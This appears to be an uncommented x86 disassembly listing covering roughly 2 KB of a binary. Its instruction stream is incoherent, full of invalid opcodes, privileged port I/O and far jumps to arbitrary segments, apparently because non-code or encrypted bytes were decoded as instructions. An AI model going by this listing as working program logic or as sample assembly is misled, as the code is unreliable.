  412f88:	scas   eax,DWORD PTR es:[edi]
  412f89:	mov    WORD PTR [ebx],gs
  412f8b:	push   cs
  412f8c:	loope  0x412f8b
  412f8e:	test   ch,bl
  412f90:	outs   dx,DWORD PTR ds:[esi]
  412f91:	fwait
  412f92:	mov    ah,0x66
  412f94:	push   eax
  412f95:	adc    eax,0xd79c7f62
  412f9a:	int3   
  412f9b:	fwait
  412f9c:	mov    WORD PTR [edx+0x59],gs
  412f9f:	mov    dh,0x45
  412fa1:	cmp    eax,0x4d6a1a83
  412fa6:	xchg   BYTE PTR [ecx+0x3ac1b50b],al
  412fac:	lds    esp,FWORD PTR [esi-0x80]
  412faf:	lods   eax,DWORD PTR ds:[esi]
  412fb0:	arpl   WORD PTR fs:[ebx],di
  412fb3:	scas   eax,DWORD PTR es:[edi]
  412fb4:	test   BYTE PTR ss:[edi],dh
  412fb7:	push   edx
  412fb8:	mov    ecx,0x94033a24
  412fbd:	test   eax,esp
  412fbf:	rol    BYTE PTR [esi-0xf],cl
  412fc2:	mov    ebp,0x325b2c5f
  412fc7:	pusha  
  412fc8:	or     BYTE PTR [eax],0xde
  412fcb:	dec    esp
  412fcc:	(bad)  
  412fcd:	mov    bl,0xe2
  412fcf:	fiadd  DWORD PTR [ebp-0x15]
  412fd2:	test   BYTE PTR [eax+0xdf87d04],dl
  412fd8:	cmp    DWORD PTR [edi-0x14],0xb
  412fdc:	ins    BYTE PTR es:[edi],dx
  412fdd:	mov    ds:0xe291026f,al
  412fe2:	xchg   edi,eax
  412fe3:	fiadd  DWORD PTR [edx+0x67cdbb3a]
  412fe9:	stc    
  412fea:	jl     0x412fc9
  412fec:	rcr    DWORD PTR [ebp+0x62],1
  412fef:	mov    al,0xd3
  412ff1:	adc    esp,ebx
  412ff3:	xor    BYTE PTR [ecx+edx*8],ah
  412ff6:	call   0x8b9814a4
  412ffb:	and    eax,0xb5e7b475
  413000:	mov    ebx,0xb93006e9
  413005:	popa   
  413006:	jnp    0x413077
  413008:	loop   0x412ffb
  41300a:	lods   al,BYTE PTR ds:[si]
  41300c:	adc    eax,DWORD PTR [ebx+eiz*4]
  41300f:	test   esi,ecx
  413011:	pop    edi
  413012:	loope  0x41301b
  413014:	or     ah,0x81
  413017:	push   cs
  413018:	xor    al,0x5d
  41301a:	sbb    eax,0x621d529
  41301f:	loope  0x41301d
  413021:	fwait
  413022:	rol    BYTE PTR [edx],1
  413024:	repnz imul edx,DWORD PTR [edi-0x74],0x988da1e5
  41302c:	in     eax,0xda
  41302e:	xchg   esp,eax
  41302f:	or     BYTE PTR [eax-0x70],ch
  413032:	sub    ecx,ecx
  413034:	push   eax
  413035:	test   al,0x6
  413037:	fmulp  st(3),st
  413039:	push   esp
  41303a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41303b:	cld    
  41303c:	sbb    eax,0x673f014f
  413041:	pop    ebx
  413042:	push   ds
  413043:	dec    edi
  413044:	sub    ch,dh
  413046:	popf   
  413047:	or     BYTE PTR [si+0x4d],al
  41304b:	mov    BYTE PTR [esp+ecx*8-0xb6c4bec],cl
  413052:	xchg   edi,eax
  413053:	xlat   BYTE PTR ds:[ebx]
  413054:	add    eax,0x63f9cb5d
  413059:	dec    ebx
  41305a:	sbb    al,0x54
  41305c:	pop    edi
  41305d:	mov    DWORD PTR ds:0x7ff2c4f4,esp
  413063:	sub    bh,BYTE PTR [eax+ecx*1]
  413066:	xor    eax,0xc9b62d2d
  41306b:	adc    DWORD PTR [edx+eiz*8-0x30],ebx
  41306f:	xor    DWORD PTR [eax+0x42feaf53],eax
  413075:	cwde   
  413076:	cmp    al,0x30
  413078:	push   edx
  413079:	mov    cl,0xe0
  41307b:	mov    ebp,0xc6b3ba13
  413080:	rol    BYTE PTR [ebx-0x4d96a1af],1
  413086:	dec    ecx
  413087:	cmc    
  413088:	sbb    eax,DWORD PTR [ebp+0x30]
  41308b:	call   0x6d73:0x9fe4d99e
  413092:	sbb    al,bl
  413094:	sub    BYTE PTR [ecx],ah
  413096:	dec    edx
  413097:	aam    0xe9
  413099:	(bad)  
  41309a:	stc    
  41309b:	xchg   edi,eax
  41309c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41309d:	sub    ch,bh
  41309f:	or     DWORD PTR [ebx-0x40741609],ecx
  4130a5:	rcr    DWORD PTR [edi-0x6eac47e2],cl
  4130ab:	sub    esp,DWORD PTR [ebx]
  4130ad:	dec    eax
  4130ae:	jne    0x41309a
  4130b0:	jecxz  0x41308a
  4130b2:	dec    esi
  4130b3:	mov    al,ah
  4130b5:	das    
  4130b6:	sbb    BYTE PTR [ebp+0x69],dl
  4130b9:	xchg   BYTE PTR [ecx+edx*4],bh
  4130bc:	jnp    0x413092
  4130be:	xchg   esp,eax
  4130bf:	popa   
  4130c0:	mov    edx,0x95cb8c3
  4130c5:	add    ebx,DWORD PTR [esi-0x11]
  4130c8:	add    dl,BYTE PTR [ebp-0x38]
  4130cb:	gs daa 
  4130cd:	mov    bl,0xb1
  4130cf:	cld    
  4130d0:	(bad)  
  4130d2:	out    dx,al
  4130d3:	cmp    BYTE PTR [ebx],cl
  4130d5:	fcomp  st(5)
  4130d7:	pop    eax
  4130d8:	popa   
  4130d9:	lock mov ds:0x8471052e,eax
  4130df:	adc    bh,BYTE PTR [ebp-0x78]
  4130e2:	sbb    bh,al
  4130e4:	popa   
  4130e5:	jnp    0x4130e6
  4130e7:	call   0x524f:0xd29d9a32
  4130ee:	jns    0x4130db
  4130f0:	xlat   BYTE PTR ds:[ebx]
  4130f1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4130f3:	pop    esp
  4130f4:	jp     0x41313b
  4130f6:	loope  0x413169
  4130f8:	sar    BYTE PTR [ecx+eiz*4],0x2e
  4130fc:	xchg   esp,ebx
  4130fe:	fcom   DWORD PTR [edi+0x4d726d1e]
  413104:	clc    
  413105:	jg     0x413126
  413107:	clc    
  413108:	retf   
  413109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41310a:	xor    eax,0xa0bfdb17
  41310f:	cli    
  413110:	ins    BYTE PTR es:[edi],dx
  413111:	dec    esp
  413112:	and    BYTE PTR [eax+0x3e287141],cl
  413118:	jge    0x413143
  41311a:	mov    bh,ch
  41311c:	cwde   
  41311d:	jge    0x413151
  41311f:	jns    0x41317a
  413121:	and    BYTE PTR [edi+0x54],ah
  413124:	dec    esp
  413125:	inc    esp
  413126:	mov    ds:0xe7a93833,eax
  41312b:	or     al,0xf2
  41312d:	pushf  
  41312e:	inc    esi
  41312f:	in     al,0x56
  413131:	pop    esi
  413132:	push   0xa91e6af4
  413137:	loopne 0x4130f3
  413139:	pop    ds
  41313a:	mov    DWORD PTR [ebx-0x20],edi
  41313d:	ror    eax,0x2b
  413140:	(bad)  
  413141:	out    dx,eax
  413142:	adc    eax,0x495d1972
  413147:	jg     0x41311e
  413149:	and    esi,DWORD PTR [eax]
  41314b:	fldpi  
  41314d:	mov    ebx,0xc87c09b1
  413152:	int    0x67
  413154:	xchg   BYTE PTR [edi+0x3b],ch
  413157:	xchg   esp,eax
  413158:	into   
  413159:	jnp    0x413166
  41315b:	call   0x69a311ff
  413160:	and    dh,bh
  413162:	ss gs ja 0x4131ad
  413166:	push   0xffffffea
  413168:	(bad)  
  41316a:	and    al,0x50
  41316c:	cli    
  41316d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41316e:	retf   
  41316f:	mov    WORD PTR [edx],fs
  413171:	mov    bh,dh
  413173:	adc    al,0x51
  413175:	mov    ds:0x8c94d6f,al
  41317a:	sub    esp,DWORD PTR [ecx+0x5794fa54]
  413180:	hlt    
  413181:	xchg   esi,eax
  413182:	shl    BYTE PTR [eax+0xb],0x67
  413186:	dec    esi
  413187:	aaa    
  413188:	mov    ds:0x9edf3ae1,al
  41318d:	or     DWORD PTR [esi],edx
  41318f:	lahf   
  413190:	sbb    dh,BYTE PTR [ebx+edx*4-0x50181d2]
  413197:	jmp    0x41315e
  413199:	repz out dx,al
  41319b:	out    0xd7,al
  41319d:	les    esp,FWORD PTR [ecx-0x3227debd]
  4131a3:	dec    ebp
  4131a4:	jge    0x413197
  4131a6:	and    eax,0xbeebcf5d
  4131ab:	mov    edx,0xa2bc97c3
  4131b0:	shl    BYTE PTR [ebx-0x7d818ef0],cl
  4131b6:	fldcw  WORD PTR [esi]
  4131b8:	push   es
  4131b9:	out    dx,al
  4131ba:	mov    cl,0xda
  4131bc:	aaa    
  4131bd:	cdq    
  4131be:	cs sub eax,0xc3e26026
  4131c4:	dec    esp
  4131c5:	cmp    dl,BYTE PTR [ecx]
  4131c7:	adc    cl,BYTE PTR [edi]
  4131c9:	imul   edi,DWORD PTR [ecx],0x960f525a
  4131cf:	mov    ebp,0xc675c330
  4131d4:	test   ah,cl
  4131d6:	inc    BYTE PTR [eax+0x73b82006]
  4131dc:	pop    ss
  4131dd:	icebp  
  4131de:	sub    DWORD PTR [edx+0x30],edi
  4131e1:	pop    edx
  4131e2:	sbb    eax,ecx
  4131e4:	cmp    al,0x2d
  4131e6:	add    eax,0xa8d2d898
  4131eb:	ret    0x2e6e
  4131ee:	inc    ebp
  4131ef:	cld    
  4131f0:	mov    esp,0xfd849f05
  4131f5:	pushf  
  4131f6:	push   ecx
  4131f7:	aaa    
  4131f8:	push   0xec6ed86d
  4131fd:	jae    0x413210
  4131ff:	adc    edx,DWORD PTR [esi-0x5e587b3b]
  413205:	cwde   
  413206:	cli    
  413207:	mov    esp,0xc5bcd4e8
  41320c:	mov    esi,0xaab729e2
  413211:	sbb    cl,BYTE PTR [ecx]
  413213:	or     BYTE PTR [ecx-0x18],bh
  413216:	in     eax,0x7f
  413218:	sub    ah,BYTE PTR [ebx-0x65f1914f]
  41321e:	mov    ebx,0x464e15e
  413223:	(bad)  
  413224:	xchg   esi,eax
  413225:	shr    DWORD PTR [eax],cl
  413227:	cmp    ah,BYTE PTR [ecx+0x2035f4dd]
  41322d:	gs xor esi,esp
  413230:	(bad)  
  413232:	in     al,0xe7
  413234:	jp     0x413222
  413236:	inc    esi
  413237:	jp     0x41329c
  413239:	dec    ebx
  41323a:	push   esp
  41323b:	icebp  
  41323c:	dec    eax
  41323d:	pop    ebp
  41323e:	add    eax,0xea08c88c
  413243:	and    bh,BYTE PTR [ecx+0x4c297bdb]
  413249:	inc    edx
  41324a:	sub    eax,0xe3b3f7a7
  41324f:	adc    bl,BYTE PTR [eax]
  413251:	cmp    esp,DWORD PTR [eax]
  413253:	jmp    0x3c1db33d
  413258:	jmp    DWORD PTR [edx]
  41325a:	stos   DWORD PTR es:[edi],eax
  41325b:	sub    eax,0x94cda37f
  413260:	add    al,0x74
  413262:	pop    ebx
  413263:	loope  0x413204
  413265:	sub    DWORD PTR [esi],esp
  413267:	and    BYTE PTR [ebp+0x50],cl
  41326a:	mov    ch,0x61
  41326c:	push   esp
  41326d:	fld    TBYTE PTR ds:[eax-0x17c46d7b]
  413274:	lock pop ecx
  413276:	jns    0x413222
  413278:	sbb    BYTE PTR [ecx],dl
  41327a:	mov    dh,0xf0
  41327c:	pop    edi
  41327d:	pop    ss
  41327e:	jmp    FWORD PTR [eax+0x1]
  413281:	jb     0x41327c
  413283:	test   eax,0xafd6ba93
  413288:	pop    eax
  413289:	jo     0x4132d4
  41328b:	cmovb  esi,DWORD PTR fs:[edx+eax*8-0x77]
  413291:	dec    edx
  413292:	or     ah,0xbb
  413295:	cmp    ch,BYTE PTR [esi-0x220c56ec]
  41329b:	cmp    eax,0xb92cb511
  4132a0:	aaa    
  4132a1:	pop    ebx
  4132a2:	pushf  
  4132a3:	xchg   ebx,eax
  4132a4:	mov    WORD PTR ds:0xb7d24acc,ds
  4132aa:	mov    eax,ds:0xf1cecef0
  4132af:	mov    ch,BYTE PTR [edx-0x41]
  4132b2:	sar    BYTE PTR [ecx+0x3c],0xb2
  4132b6:	nop
  4132b7:	sub    esp,DWORD PTR [edi]
  4132b9:	mov    al,ds:0x34b37a
  4132be:	mul    DWORD PTR [ebx+0x57]
  4132c1:	es call 0xb330e45
  4132c7:	inc    esp
  4132c8:	xor    eax,0xf719e47e
  4132cd:	xchg   esp,eax
  4132ce:	xor    eax,0x47b046d3
  4132d3:	addr16 aam 0x19
  4132d6:	lds    ebx,FWORD PTR [eax+0x54]
  4132d9:	sbb    al,0xa0
  4132db:	xor    cl,BYTE PTR [ebx-0x6]
  4132de:	mov    al,0x2
  4132e0:	out    dx,al
  4132e1:	pop    ecx
  4132e2:	fstp   QWORD PTR [ecx+0x651efe82]
  4132e8:	cmp    DWORD PTR [ebx-0x76],esi
  4132eb:	jae    0x4132dd
  4132ed:	jp     0x4132e3
  4132ef:	(bad)  
  4132f0:	out    dx,eax
  4132f1:	shl    DWORD PTR [esp+ebx*4],0xee
  4132f5:	mov    ds:0xc390bb4b,eax
  4132fa:	mov    edx,0xf1783120
  4132ff:	sub    ebp,DWORD PTR [edi+edx*2-0x34]
  413303:	outs   dx,DWORD PTR ds:[esi]
  413304:	pop    esi
  413305:	stos   BYTE PTR es:[edi],al
  413306:	inc    ebx
  413307:	xor    al,0x9d
  413309:	loop   0x413304
  41330b:	cmp    DWORD PTR ds:[ebp+0x200b39b7],ebx
  413312:	out    0xc4,al
  413314:	in     eax,0xf6
  413316:	pop    ecx
  413317:	sbb    eax,0xc2c89609
  41331c:	scas   al,BYTE PTR es:[edi]
  41331d:	in     eax,0xb3
  41331f:	push   cs
  413320:	sahf   
  413321:	xchg   ebx,eax
  413322:	jb     0x41331c
  413324:	xor    al,0x6d
  413326:	sbb    ch,BYTE PTR [esi+0x1d]
  413329:	mov    eax,ds:0xaac1bdb
  41332e:	clc    
  41332f:	and    edi,edx
  413331:	ins    DWORD PTR es:[edi],dx
  413332:	nop
  413333:	in     eax,dx
  413334:	pop    esi
  413335:	mov    edx,0x246fa142
  41333a:	mov    edx,0x8749f2a
  41333f:	loopne 0x41335b
  413341:	jmp    0x1dc4f323
  413346:	sbb    DWORD PTR ds:0x200fb103,edi
  41334c:	shr    BYTE PTR ds:0x3da1cefd,0xf6
  413353:	in     al,dx
  413354:	dec    ecx
  413355:	jge    0x41333d
  413357:	in     al,0xd6
  413359:	in     al,dx
  41335a:	push   esi
  41335b:	jmp    0x1809:0x66a2e174
  413362:	xchg   al,dh
  413364:	jp     0x4132e8
  413366:	push   ebx
  413367:	shl    DWORD PTR [edi-0x9],0x1c
  41336b:	xor    bl,dh
  41336d:	push   eax
  41336e:	loope  0x4133a8
  413370:	adc    BYTE PTR [ecx-0x2e],ch
  413373:	sbb    bl,BYTE PTR [ecx-0x7e058bb7]
  413379:	adc    edx,DWORD PTR [esi]
  41337b:	adc    esi,ecx
  41337d:	mov    ebp,0x61b93da9
  413382:	and    ch,ah
  413384:	pushf  
  413385:	xchg   ebx,eax
  413386:	mov    al,ds:0xab025f1
  41338b:	into   
  41338c:	jb     0x413364
  41338e:	pop    esi
  41338f:	cmp    DWORD PTR [edi],esp
  413391:	popf   
  413392:	and    edx,DWORD PTR [edi+esi*1]
  413395:	jb     0x4133da
  413397:	(bad)  
  413398:	mov    cl,0xc2
  41339a:	dec    ebx
  41339b:	mov    esp,0x2e2ef248
  4133a0:	fcomip st,st(3)
  4133a2:	push   edx
  4133a3:	mov    eax,0x6928ae61
  4133a8:	cmp    DWORD PTR [ebx],eax
  4133aa:	rol    bl,1
  4133ac:	push   0x3f
  4133ae:	mov    BYTE PTR [ebp+0x6857db4c],dh
  4133b4:	xchg   ebx,eax
  4133b5:	fdivrp st(1),st
  4133b7:	inc    edi
  4133b8:	icebp  
  4133b9:	and    BYTE PTR [esi],0x16
  4133bc:	imul   edx,DWORD PTR [eax+0x403f1201],0xffffffe1
  4133c3:	push   ss
  4133c4:	add    al,0xef
  4133c6:	push   ebx
  4133c7:	les    ebx,FWORD PTR [eax+0x25]
  4133ca:	or     ch,BYTE PTR [edi-0x5c2ff475]
  4133d0:	push   0xffffffa1
  4133d2:	je     0x413412
  4133d4:	push   ecx
  4133d5:	pextrw ebp,mm0,0x4e
  4133d9:	pop    edi
  4133da:	(bad)  
  4133db:	fs sahf 
  4133dd:	mov    esi,0x35a3571
  4133e2:	pushf  
  4133e3:	rcl    BYTE PTR [ecx-0x6c],1
  4133e6:	or     BYTE PTR [edi-0x31c1206c],dh
  4133ec:	pushf  
  4133ed:	and    BYTE PTR [edi-0x43],0xcf
  4133f1:	push   edi
  4133f2:	mov    dh,BYTE PTR [edi-0x68]
  4133f5:	xchg   edx,eax
  4133f6:	repz aam 0x16
  4133f9:	pop    ds
  4133fa:	outs   dx,BYTE PTR ds:[esi]
  4133fb:	test   DWORD PTR [ebp-0x64],0x17142fa1
  413402:	mov    edi,0x895c64dd
  413407:	repz xlat BYTE PTR ds:[ebx]
  413409:	sbb    al,bh
  41340b:	dec    esi
  41340c:	push   edx
  41340d:	mov    ecx,0xdce3537f
  413412:	call   0x969e6a3a
  413417:	sub    BYTE PTR [eax+edi*2],al
  41341a:	jae    0x413484
  41341c:	adc    BYTE PTR [ebx-0x40],al
  41341f:	add    al,0x9c
  413421:	lock ds (bad) 
  413424:	stos   DWORD PTR es:[edi],eax
  413425:	mov    edx,0xdf093456
  41342a:	inc    ebp
  41342b:	ss (bad) 
  41342d:	daa    
  41342e:	sub    ebx,edi
  413430:	inc    edx
  413431:	enter  0x3390,0x77
  413435:	and    BYTE PTR [ecx-0x6b],0x39
  413439:	pop    ecx
  41343a:	xor    edi,DWORD PTR [edx-0x1be12ce5]
  413440:	sub    eax,0xe077065f
  413445:	adc    ebp,ebp
  413447:	scas   al,BYTE PTR es:[edi]
  413448:	lahf   
  413449:	rcr    DWORD PTR [ebp-0x14bf861e],0xcc
  413450:	sbb    eax,edi
  413452:	jl     0x41344e
  413454:	call   0xf9de:0x6891ef2b
  41345b:	add    BYTE PTR [ebp-0x721734b2],ch
  413461:	or     ch,BYTE PTR [ebx+edx*4+0x48]
  413465:	arpl   WORD PTR [eax-0x152d2f29],bx
  41346b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41346c:	sub    BYTE PTR [esp+ebp*8+0x3f06ae32],cl
  413473:	cdq    
  413474:	push   0xe61161e4
  413479:	int3   
  41347a:	dec    BYTE PTR [esp+esi*2+0x67]
  41347e:	add    ebp,eax
  413480:	imul   esp,edi,0xebd7ccbb
  413486:	daa    
  413487:	je     0x413479
  413489:	iret   
  41348a:	sub    eax,0x3bfa4465
  41348f:	jl     0x41348b
  413491:	mov    ebx,DWORD PTR [ebp-0xb]
  413494:	jmp    0x32bc:0xeb348a66
  41349b:	add    cl,BYTE PTR [ebx+0x21]
  41349e:	retf   0x493f
  4134a1:	inc    ebx
  4134a2:	inc    esi
  4134a3:	pop    esi
  4134a4:	mov    WORD PTR [esi],?
  4134a6:	fisubr WORD PTR [esi+0xb0dd5ad]
  4134ac:	cmp    bl,BYTE PTR [esp+edi*4]
  4134af:	mov    edx,0x331b2107
  4134b4:	xchg   edi,eax
  4134b5:	sub    ch,ch
  4134b7:	(bad)  
  4134b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b9:	cdq    
  4134ba:	xor    DWORD PTR [edi+0x5006d17f],esi
  4134c0:	fnclex 
  4134c2:	xor    eax,0xe52051ed
  4134c7:	rcr    DWORD PTR [eax+0x746680b7],cl
  4134cd:	shl    DWORD PTR [eax],0xf0
  4134d0:	lock xchg DWORD PTR [ebx+0x2361ef61],edx
  4134d7:	and    DWORD PTR [esi],esp
  4134d9:	in     eax,0xe6
  4134db:	xor    dh,BYTE PTR [edx+esi*4+0x7f]
  4134df:	mov    BYTE PTR [eax-0x322796a],ch
  4134e5:	clc    
  4134e6:	addr16 dec esi
  4134e8:	mov    edi,0x4e08f112
  4134ed:	push   cs
  4134ee:	repnz call 0xe026:0xe16936a0
  4134f6:	popf   
  4134f7:	(bad)  
  4134f8:	fcmovnbe st,st(5)
  4134fa:	or     bh,BYTE PTR [ebx]
  4134fc:	addr16 push ebx
  4134fe:	cli    
  4134ff:	imul   edi,DWORD PTR [eax],0x9a7c9565
  413505:	jo     0x4134d0
  413507:	aas    
  413508:	aad    0x7c
  41350a:	hlt    
  41350b:	xchg   esp,eax
  41350c:	sbb    bh,BYTE PTR [esi-0x5e]
  41350f:	jno    0x4134c7
  413511:	daa    
  413512:	xchg   edi,eax
  413513:	imul   ebx,DWORD PTR ds:0x5e03c993,0x6701fcd8
  41351d:	in     al,dx
  41351e:	ficomp WORD PTR [ebp+0x49]
  413521:	dec    ebp
  413522:	pop    edx
  413523:	into   
  413524:	dec    BYTE PTR [ecx]
  413526:	or     DWORD PTR [edi+0x25],ebx
  413529:	mov    eax,0x38799bee
  41352e:	mov    al,ds:0xebb85566
  413533:	jmp    0x1c59dea3
  413538:	mov    bl,0x30
  41353a:	add    eax,0xe3609468
  41353f:	dec    esi
  413540:	xor    BYTE PTR [esi+0x2a],al
  413543:	dec    edx
  413544:	sub    esp,DWORD PTR [ebp+0x71]
  413547:	dec    esi
  413548:	inc    edx
  413549:	movaps XMMWORD PTR [eax+0x4f],xmm1
  41354d:	(bad)  
  41354f:	push   edx
  413550:	pop    ecx
  413551:	xchg   esi,eax
  413552:	cmc    
  413553:	push   0xffffff98
  413555:	jne    0x41357b
  413557:	fsubr  DWORD PTR [ebp+0x4b7a7a65]
  41355d:	clc    
  41355e:	je     0x413542
  413560:	in     al,0xe0
  413562:	push   ds
  413563:	jns    0x41359f
  413565:	jbe    0x41358a
  413567:	cmp    DWORD PTR [ebx-0x582e30e5],eax
  41356d:	iret   
  41356e:	call   0x18abeb67
  413573:	fidivr DWORD PTR ds:0x67d8a15d
  413579:	call   FWORD PTR [edi+esi*2+0x609e21cb]
  413580:	js     0x413563
  413582:	aas    
  413583:	mov    al,0x56
  413585:	xor    DWORD PTR ss:[ebx-0x23],ebx
  413589:	mov    esp,0x4af08b39
  41358e:	shl    DWORD PTR es:[esp+edx*1+0x3aba49fc],cl
  413596:	test   DWORD PTR [esi+0x7e],esp
  413599:	push   esp
  41359a:	inc    eax
  41359b:	out    0x78,al
  41359d:	out    dx,al
  41359e:	mov    eax,0x58e8a059
  4135a3:	lods   al,BYTE PTR ds:[esi]
  4135a4:	ficomp DWORD PTR [edi-0x11172f06]
  4135aa:	cmp    al,0x40
  4135ac:	stos   BYTE PTR es:[edi],al
  4135ad:	cmp    al,0xcd
  4135af:	popa   
  4135b0:	cld    
  4135b1:	popa   
  4135b2:	xchg   ebx,eax
  4135b3:	mov    edi,0x8bcdecf2
  4135b8:	sub    edx,DWORD PTR [eax+0x5eac9e7d]
  4135be:	arpl   WORD PTR [ecx+edx*2-0x59],bp
  4135c2:	cmp    BYTE PTR [edi-0x7d],cl
  4135c5:	mov    bh,0xd0
  4135c7:	ins    BYTE PTR es:[edi],dx
  4135c8:	mov    ch,0x6b
  4135ca:	ror    BYTE PTR [edi],0x95
  4135cd:	pusha  
  4135ce:	out    0x17,eax
  4135d0:	fsub   QWORD PTR [eax-0x31befe49]
  4135d6:	shr    DWORD PTR [ebx-0x27fdd158],0x72
  4135dd:	xchg   ecx,eax
  4135de:	and    eax,0x1ddc2a3d
  4135e3:	out    dx,al
  4135e4:	pop    eax
  4135e5:	cmp    eax,0xd123ca80
  4135ea:	inc    ebp
  4135eb:	iret   
  4135ec:	and    eax,0x6e12a4c8
  4135f1:	xchg   ecx,eax
  4135f2:	mov    bl,0xc3
  4135f4:	cli    
  4135f5:	xor    ebx,ecx
  4135f7:	inc    esp
  4135f8:	pop    ecx
  4135f9:	dec    sp
  4135fb:	out    0x15,eax
  4135fd:	jo     0x41367e
  4135ff:	pushf  
  413600:	xchg   edi,eax
  413601:	lock and BYTE PTR [edx-0x59894fc9],dh
  413608:	in     eax,0x73
  41360a:	mov    cl,0x81
  41360c:	fwait
  41360d:	push   esi
  41360e:	push   ebp
  41360f:	mov    esi,DWORD PTR [ebx]
  413611:	aam    0xe3
  413613:	mov    WORD PTR [eax],es
  413615:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413616:	popa   
  413617:	ret    0xc346
  41361a:	call   0xd1e87cfd
  41361f:	cmp    edi,ebp
  413621:	arpl   WORD PTR [eax-0x21],si
  413624:	test   DWORD PTR [eax-0xa],ecx
  413627:	inc    ecx
  413628:	push   ss
  413629:	pop    esp
  41362a:	jmp    0x2001:0x866e336d
  413631:	or     DWORD PTR [ebx],ebp
  413633:	fstp   TBYTE PTR [esi+0x73d5d7ad]
  413639:	idiv   dh
  41363b:	and    eax,0xdabbd583
  413640:	xchg   edx,eax
  413641:	push   esp
  413642:	cmp    edx,esi
  413644:	out    dx,eax
  413645:	repnz sub edi,0xffffff8c
  413649:	xor    DWORD PTR [ebx],ebp
  41364b:	(bad)  
  41364d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41364e:	push   ebp
  41364f:	pop    es
  413650:	mul    BYTE PTR [edx+edi*4-0x5c]
  413654:	scas   eax,DWORD PTR es:[edi]
  413655:	retf   
  413656:	add    BYTE PTR [edi-0xd],bh
  413659:	es pushf 
  41365b:	xchg   ebp,eax
  41365c:	inc    ebp
  41365d:	rcr    DWORD PTR [eax+0x7bfe5786],cl
  413663:	outs   dx,DWORD PTR ds:[esi]
  413664:	in     al,dx
  413665:	into   
  413666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413667:	adc    ebx,0xffffff89
  41366a:	rcr    BYTE PTR [esi-0x6eb6e9cd],cl
  413670:	push   ebx
  413671:	lahf   
  413672:	std    
  413673:	add    DWORD PTR [eax-0x68],edi
  413676:	retf   0xa819
  413679:	sbb    ah,BYTE PTR ds:0x9b03b503
  41367f:	repnz fucomip st,st(5)
  413682:	loope  0x4136af
  413684:	xchg   edx,eax
  413685:	adc    esp,DWORD PTR [ebx+0x62]
  413688:	addr16 push ebp
  41368a:	test   edx,ebp
  41368c:	adc    DWORD PTR [bp+di-0x28],ebp
  413690:	dec    esi
  413691:	xlat   BYTE PTR ds:[ebx]
  413693:	dec    esp
  413694:	jbe    0x413674
  413696:	mov    eax,ds:0x22ab9e88
  41369b:	fisttp QWORD PTR [edx+0x51]
  41369e:	(bad)  
  41369f:	xor    BYTE PTR [ecx-0x54],dh
  4136a2:	cwde   
  4136a3:	sub    al,0x6b
  4136a5:	sub    al,0xdf
  4136a7:	clc    
  4136a8:	(bad)  
  4136a9:	in     al,0x14
  4136ab:	jecxz  0x41362e
  4136ad:	call   0x3692c82c
  4136b2:	sbb    eax,0x939740a8
  4136b7:	pop    edx
  4136b8:	mov    ebp,0x2e0b3852
  4136bd:	loopne 0x4136c0
  4136bf:	in     al,0x4
  4136c1:	mov    edi,0xbb853ca6
  4136c6:	addr16 out 0xb2,eax
  4136c9:	and    ch,bl
  4136cb:	fsub   DWORD PTR [eax+0x5f]
  4136ce:	jb     0x4136f4
  4136d0:	cmc    
  4136d1:	mov    dh,0x4a
  4136d3:	rcl    BYTE PTR ss:[esi],1
  4136d6:	in     al,dx
  4136d7:	sub    al,0xb8
  4136d9:	clc    
  4136da:	push   ss
  4136db:	xchg   edx,eax
  4136dc:	mov    dh,0x1d
  4136de:	jge    0x413750
  4136e0:	icebp  
  4136e1:	sbb    DWORD PTR [eax],eax
  4136e3:	rol    DWORD PTR [edx+edx*1-0x67],cl
  4136e7:	push   ecx
  4136e8:	sbb    BYTE PTR [ebp+0x7],ah
  4136eb:	out    dx,eax
  4136ec:	cli    
  4136ed:	dec    eax
  4136ee:	mov    esp,0xa146c2b1
  4136f3:	push   0x34
  4136f5:	idiv   dh
  4136f7:	fidivr DWORD PTR [edx-0x2dd26b99]
  4136fd:	imul   esi,DWORD PTR fs:[ecx-0x4c659607],0x21f3743c
  413708:	sub    al,0xc3
  41370a:	and    ecx,0xd929b103
  413710:	fs lahf 
  413712:	jmp    0x3354:0x328818ef
  413719:	inc    ebp
  41371a:	push   edx
  41371b:	xchg   ebx,eax
  41371c:	lea    eax,[esi+ebp*8-0x474b5907]
  413723:	fnsave [eax+0x103a2347]
  413729:	adc    ebx,DWORD PTR [esi+ebx*2+0x3]
  41372d:	scas   al,BYTE PTR es:[edi]
  41372e:	cmp    BYTE PTR [ebx],ch
  413730:	fsubp  st(4),st
  413732:	fstp   QWORD PTR [edx]
  413734:	xchg   ebx,eax
  413735:	clc    
  413736:	jbe    0x413765
  413738:	inc    edx
  413739:	retf   
  41373a:	stc    
  41373b:	pop    ss
  41373c:	(bad)  
  41373e:	mov    cl,0x62
  413740:	lock les esi,FWORD PTR [edx]
  413743:	mov    al,0x8
  413745:	push   ebp
  413746:	pop    edx
  413747:	dec    edi
  413748:	sub    eax,0x54e3739f
  41374d:	push   edx
  41374e:	in     al,dx
  41374f:	cmp    BYTE PTR [ebp+0x44357530],0x5a
  413756:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413757:	ins    BYTE PTR es:[edi],dx
  413758:	mov    esp,0xd56cb7ae
  41375d:	fistp  DWORD PTR [ebx]
  41375f:	mov    bl,0xd1
  413761:	xchg   DWORD PTR [eax+0x1b],esi
  413764:	rol    BYTE PTR [ebp+0x1c],0x1e
  413768:	jle    0x41374a
  41376a:	test   BYTE PTR [ebx-0x12],0xab
  41376e:	repnz add al,0xb7
  413771:	jnp    0x413739
  413773:	inc    edi
  413774:	inc    ebp
  413775:	mov    eax,0x6aa6bba0
  41377a:	xor    DWORD PTR [eax+ecx*8-0x79],ebx
  41377e:	out    0xb6,al
  413780:	jg     0x413739
  413782:	mov    ecx,0x74d3346f
  413787:	mov    BYTE PTR [ebx-0x1d],cl
  41378a:	stos   DWORD PTR es:[edi],eax
  41378b:	(bad)  
  41378c:	and    dl,BYTE PTR [esi+edx*4-0x14ce7bce]
